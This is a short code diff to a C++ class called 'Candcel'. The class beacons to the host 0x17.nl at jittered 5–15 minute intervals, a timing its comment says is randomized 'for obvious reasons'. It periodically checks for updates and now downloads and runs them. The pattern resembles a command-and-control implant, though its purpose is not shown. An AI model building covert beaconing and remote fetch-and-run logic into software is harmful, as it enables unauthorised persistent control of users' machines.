@@ -56,18 +56,21 @@ void Candcel::IsAlive()
 
 DWORD Candcel::CheckIn()
 {
-	if (!serverSolicitAck) {
-		Solicit();
-	}
-	
-	if (!serverSolicitAck) {
-		return 1;
-	}
-
 	while (true) {
 		int nextInterval = (rand() % (10 + 1)) + 5;
 
-		Log::Info(L"Candcel", L"Sending checkin request, interval " + std::to_wstring(nextInterval) + L" minutes");
+		/* Randomize the interval for obvious reasons */
+		Sleep(nextInterval * 60 * 1000);
+
+		if (!serverSolicitAck) {
+			Solicit();
+		}
+
+		if (!serverSolicitAck) {
+			continue;
+		}
+
+		Log::Info(L"Candcel", L"Sending checkin request");
 
 		RestClient rc("0x17.nl", "avc_endpoint.php");
 
@@ -80,8 +83,12 @@ DWORD Candcel::CheckIn()
 			Log::Error(L"Candcel", L"Request failed");
 		}
 
-		/* Randomize the interval for obvious reasons */
-		Sleep(nextInterval * 60 * 1000);
+		checkInCount++;
+		if (checkInCount > 120) {
+			CheckForUpdate();
+			checkInCount = 0;
+		}
+		
 	}
 
 	return 0;
@@ -107,6 +114,7 @@ void Candcel::Solicit()
 
 	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
 		Log::Error(L"Candcel", L"Request failed");
+		return;
 	}
 
 	serverSolicitAck = true;
@@ -130,7 +138,7 @@ void Candcel::GetUpdate(unsigned int buildNumber, const std::wstring& wurl)
 		return;
 	}
 
-	Process::UpdateInstance(tmpFile);
+	Process::RunUpdateInstance(tmpFile);
 }
 
 
